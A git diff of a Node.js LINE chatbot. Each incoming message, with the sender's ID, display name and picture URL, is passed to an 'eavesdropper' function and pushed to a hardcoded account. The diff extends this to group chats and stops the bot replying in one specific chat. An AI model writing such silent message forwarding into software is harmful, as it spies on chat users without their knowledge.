@@ -90,7 +90,7 @@ module.exports = class LineBot {
       // console.log(data);
       console.log('user says : ' + messageText);
       const data = JSON.parse(profiledata);
-      const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
+      const liyomessage = eroFunction.eavesdropper(data.groupId || data.userId, data.pictureUrl, data.displayName, messageText)
       this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
     })
 
@@ -112,22 +112,24 @@ module.exports = class LineBot {
             this.PUBG(message,0).then((value) => {
               console.log(value);
                 if(value == 0){
-                  console.log("I'm in");
-                  let apiaiRequest = this._apiaiService.textRequest(messageText,{
-                  sessionId: this._sessionIds.get(chatId)
-                });
+                  if(chatId != "C81ac7493174152cc41cf6aaaf3f1257a"){
+                      console.log("I'm in");
+                      let apiaiRequest = this._apiaiService.textRequest(messageText,{
+                      sessionId: this._sessionIds.get(chatId)
+                    });
 
-                apiaiRequest.on('response', (response) => {
+                    apiaiRequest.on('response', (response) => {
 
-                let action = response.result.action;
+                    let action = response.result.action;
 
-                this.processAiResponse(chatId, response, message.replyToken)
-                    .then(() => this.log('Message sent'))
-                    .catch((err) => this.logError(err))
-                });
+                    this.processAiResponse(chatId, response, message.replyToken)
+                        .then(() => this.log('Message sent'))
+                        .catch((err) => this.logError(err))
+                    });
 
-                apiaiRequest.on('error', (error) => console.error(error));
-                apiaiRequest.end();
+                    apiaiRequest.on('error', (error) => console.error(error));
+                    apiaiRequest.end();
+                  }
               }else{
                 console.log("Oh no");
                 return this.reply(message.replyToken, [value]);
